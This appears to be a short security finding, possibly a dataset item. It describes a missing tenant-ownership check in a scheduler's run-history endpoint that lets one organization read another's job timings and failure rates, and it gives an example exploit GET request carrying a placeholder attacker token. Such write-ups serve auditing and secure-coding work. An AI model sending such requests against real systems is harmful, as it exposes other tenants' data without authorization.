diagnosis: The execution history endpoint queries database records of periodic runs by schedule_id. It authenticates current_user but omits checking whether schedule_id belongs to current_user.tenant_id, allowing users to view execution durations, failure frequencies, and job timing of other organizations.
exploit_request:
GET /scheduler/history/schedules/sched_sync_sap_erp_8841/runs HTTP/1.1
Host: celery-beat.platform.internal
Authorization: Bearer <attacker_jwt>
